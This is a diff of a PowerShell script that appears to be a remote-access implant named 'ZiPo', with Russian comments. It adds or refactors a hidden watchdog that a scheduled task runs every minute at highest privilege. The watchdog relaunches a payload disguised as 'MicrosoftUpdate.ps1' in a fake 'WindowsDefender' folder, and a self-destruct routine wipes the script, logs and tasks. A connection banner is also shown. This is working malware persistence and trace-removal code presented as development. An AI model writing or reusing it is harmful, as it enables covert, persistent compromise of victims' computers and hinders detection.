@@ -410,29 +410,33 @@ try {
 
 function Register-SelfWatchTask {
     $taskName = "ZiPo_SelfWatch"
-    $watchScriptPath = "$env:APPDATA\WindowsDefender\watchdog.ps1"
-    
+    $basePath = "$env:APPDATA\WindowsDefender"
+    $watchScriptPath = Join-Path $basePath "watchdog.ps1"
+    $targetScript = Join-Path $basePath "MicrosoftUpdate.ps1"
+    $logPath = Join-Path $basePath "watchdog.log"
+
     $watchScript = @"
-# Watchdog запущен в: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-Add-Content -Path "$env:TEMP\watchdog.log" -Value "[*] Watchdog run: $(Get-Date)"
-\$path = '$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1'
+# Watchdog run: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+Add-Content -Path '$logPath' -Value '[*] Watchdog run: $(Get-Date)'
+\$path = '$targetScript'
 \$running = Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match [Regex]::Escape(\$path) }
 if (-not \$running) {
     Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`""
 }
 "@
 
-    # Сохраняем скрипт
+    # Сохраняем watchdog рядом с основным скриптом
     $watchScript | Out-File -FilePath $watchScriptPath -Encoding UTF8 -Force
 
-    # Удаляем старую задачу, если есть
+    # Удаляем старую задачу, если она есть
     schtasks /Delete /TN $taskName /F > $null 2>&1
 
-    # Создаем задачу с корректным расписанием: ежеминутно
+    # Создаём новую задачу: каждую минуту
     schtasks /Create /TN $taskName /SC MINUTE /MO 1 `
         /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchScriptPath`"" `
         /RL HIGHEST /F | Out-Null
 }
+
 
 
 
@@ -637,12 +641,12 @@ function Update-Self {
 
     function Self-Destruct {
     try {
-        $scriptPath = $MyInvocation.MyCommand.Path
-        if (-not $scriptPath) {
-            $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
-        }
+        $basePath = "$env:APPDATA\WindowsDefender"
+        $scriptPath = Join-Path $basePath "MicrosoftUpdate.ps1"
+        $watchdogPath = Join-Path $basePath "watchdog.ps1"
+        $watchdogLog = Join-Path $basePath "watchdog.log"
+        $cleanupBat = Join-Path $basePath "cleanup.bat"
 
-        $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
         $taskNames = @(
             "MicrosoftEdgeUpdateChecker",
             "ZiPo_UpdateCheck",
@@ -650,13 +654,13 @@ function Update-Self {
             "ZiPo_Cleanup"
         )
 
-        # Формируем тело батника
+        # Формируем тело .bat файла
         $batContent = @"
 @echo off
 timeout /t 5 >nul
-del "$scriptPath" /f /q
-del "$env:TEMP\updatecheck.ps1" /f /q >nul 2>&1
-del "$env:TEMP\watchdog.ps1" /f /q >nul 2>&1
+del "$scriptPath" /f /q >nul 2>&1
+del "$watchdogPath" /f /q >nul 2>&1
+del "$watchdogLog" /f /q >nul 2>&1
 "@
 
         foreach ($tn in $taskNames) {
@@ -665,10 +669,9 @@ del "$env:TEMP\watchdog.ps1" /f /q >nul 2>&1
 
         $batContent += "`ndel `%~f0 /f /q"
 
-        # Сохраняем батник
+        # Сохраняем и запускаем .bat файл
         $batContent | Set-Content -Path $cleanupBat -Encoding ASCII
 
-        # Запланировать удаление через минуту
         schtasks /Create /TN "ZiPo_Cleanup" /SC ONCE /TR "`"$cleanupBat`"" `
             /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null
 
@@ -679,6 +682,7 @@ del "$env:TEMP\watchdog.ps1" /f /q >nul 2>&1
         return "[ERROR] Self-destruct failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
@@ -712,7 +716,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            GAYq                                                                                                                                                                   
+                                            GAYqqwfggw                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
